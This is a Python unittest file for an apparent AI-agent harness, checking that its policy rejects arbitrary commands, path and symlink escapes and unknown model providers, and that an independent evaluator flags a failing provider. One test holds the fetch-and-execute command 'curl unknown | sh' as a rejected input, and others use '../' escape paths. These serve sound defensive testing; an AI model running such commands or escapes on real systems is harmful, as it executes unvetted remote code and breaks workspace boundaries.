"""G1 contract / policy / independent evaluator regression tests."""
import json
from pathlib import Path
import tempfile
import unittest
from foundation.harness import (
    Change, DEMO_TASK, FixtureProvider, PolicyError, Proposal, apply_proposal,
    load_task, restore_authority, run_demo
)
from foundation.__main__ import init_project

class HarnessTests(unittest.TestCase):
    def test_task_contract_rejects_arbitrary_commands(self):
        with tempfile.TemporaryDirectory() as tmp:
            obj = json.loads(DEMO_TASK.read_text(encoding="utf-8"))
            obj["command"] = "curl unknown | sh"
            p = Path(tmp) / "task.json"
            p.write_text(json.dumps(obj))
            with self.assertRaises(PolicyError):
                load_task(p)

    def test_task_contract_rejects_path_escalation(self):
        with tempfile.TemporaryDirectory() as tmp:
            obj = json.loads(DEMO_TASK.read_text(encoding="utf-8"))
            obj["allowedPaths"] = ["../AGENTS.md"]
            p = Path(tmp) / "task.json"
            p.write_text(json.dumps(obj))
            with self.assertRaises(PolicyError):
                load_task(p)

    def test_unknown_model_provider_denied(self):
        with self.assertRaises(PolicyError):
            FixtureProvider("codex-cli")

    def test_policy_checks_all_changes_before_writing(self):
        with tempfile.TemporaryDirectory() as tmp:
            project = Path(tmp) / "project"
            init_project("python-service", project)
            good = Change("app/greeting.py", "ok")
            bad = Change("../README.md", "malicious")
            with self.assertRaises(PolicyError):
                apply_proposal(project, Proposal("bad", (good, bad)), ("app/greeting.py",))
            self.assertFalse((project / "app/greeting.py").exists())

    def test_symlink_escape_rejected(self):
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp)
            project = base / "project"
            init_project("python-service", project)
            (project / "app" / "linked.py").symlink_to(base / "external.py")
            with self.assertRaises(PolicyError):
                apply_proposal(project, Proposal("bad", (Change("app/linked.py", "bad"),)),
                               ("app/linked.py",))
            self.assertFalse((base / "external.py").exists())

    def test_authority_digest_created(self):
        with tempfile.TemporaryDirectory() as tmp:
            project = Path(tmp) / "project"
            init_project("python-service", project)
            snapshot = restore_authority(project)
            self.assertEqual(len(snapshot.digest), 64)

    def test_successful_lifecycle_produces_evidence(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "good"
            self.assertTrue(run_demo(out))
            ev = json.loads((out / ".foundation" / "agent-evidence.json").read_text())
            self.assertEqual(ev["result"], "pass")
            self.assertEqual(ev["provider"], "fixture-pass")
            self.assertEqual(ev["trustLevel"], "local-unattested")
            self.assertEqual([x["result"] for x in ev["checks"]], ["pass", "pass", "pass"])
            self.assertTrue((out / "app/greeting.py").exists())

    def test_independent_acceptance_detects_bad_provider(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "bad"
            self.assertFalse(run_demo(out, provider_id="fixture-fail"))
            ev = json.loads((out / ".foundation" / "agent-evidence.json").read_text())
            self.assertEqual(ev["checks"][-1]["id"], "python-greeting/v0")
            self.assertEqual(ev["checks"][-1]["result"], "fail")

    def test_no_overwrite_of_existing_destination(self):
        with tempfile.TemporaryDirectory() as tmp:
            out = Path(tmp) / "already"
            out.mkdir()
            with self.assertRaises(FileExistsError):
                run_demo(out)

if __name__ == "__main__":
    unittest.main()
